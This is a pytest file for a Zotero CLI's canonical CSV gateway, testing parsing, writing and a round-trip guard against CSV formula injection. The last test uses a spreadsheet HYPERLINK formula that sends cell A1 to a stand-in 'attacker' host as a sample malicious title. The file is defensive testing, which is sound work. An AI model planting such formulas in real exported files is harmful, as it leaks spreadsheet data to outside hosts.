from unittest.mock import mock_open, patch

import pytest

from zotero_cli.core.models import ResearchPaper
from zotero_cli.infra.canonical_csv_lib import CanonicalCsvLibGateway


@pytest.fixture
def gateway():
    return CanonicalCsvLibGateway()


def test_parse_file_success(gateway):
    csv_data = "title,doi,arxiv_id,abstract,authors,year,publication,url\nPaper 1,10.1/1,1706.03762,Abs 1,Auth 1; Auth 2,2023,Pub 1,http://url1"
    m = mock_open(read_data=csv_data)
    with patch("builtins.open", m):
        papers = list(gateway.parse_file("test.csv"))

    assert len(papers) == 1
    p = papers[0]
    assert p.title == "Paper 1"
    assert p.doi == "10.1/1"
    assert p.arxiv_id == "1706.03762"
    assert p.abstract == "Abs 1"
    assert p.authors == ["Auth 1", "Auth 2"]
    assert p.year == "2023"
    assert p.publication == "Pub 1"
    assert p.url == "http://url1"


def test_write_file_success(gateway):
    papers = [
        ResearchPaper(
            title="Paper 1",
            doi="10.1/1",
            authors=["Auth 1", "Auth 2"],
            abstract="Abs 1",
            year="2023",
        )
    ]
    m = mock_open()
    with patch("builtins.open", m):
        gateway.write_file(iter(papers), "out.csv")

    # Check that write was called. mock_open is tricky with DictWriter,
    # but we can check if the file was opened for writing.
    m.assert_called_once_with("out.csv", mode="w", encoding="utf-8", newline="")


def test_write_then_parse_sanitizes_and_round_trips(gateway, tmp_path):
    """Issue #237: a title starting with '=' etc. must be sanitized on
    write (CSV formula injection guard) and the sanitization marker must
    be transparently undone on re-import, since this format is both
    written and re-read by this project (`system normalize`)."""
    csv_path = tmp_path / "out.csv"
    papers = [
        ResearchPaper(
            title='=HYPERLINK("http://attacker/?"&A1,"x")',
            doi="10.1/1",
            authors=["Auth 1"],
            abstract="Normal abstract",
            year="2023",
        )
    ]

    gateway.write_file(iter(papers), str(csv_path))

    raw_content = csv_path.read_text(encoding="utf-8")
    # The literal file on disk must carry the escape marker.
    assert "\"'=HYPERLINK" in raw_content

    reparsed = list(gateway.parse_file(str(csv_path)))
    assert len(reparsed) == 1
    # Re-importing it must recover the original, unescaped title.
    assert reparsed[0].title == '=HYPERLINK("http://attacker/?"&A1,"x")'
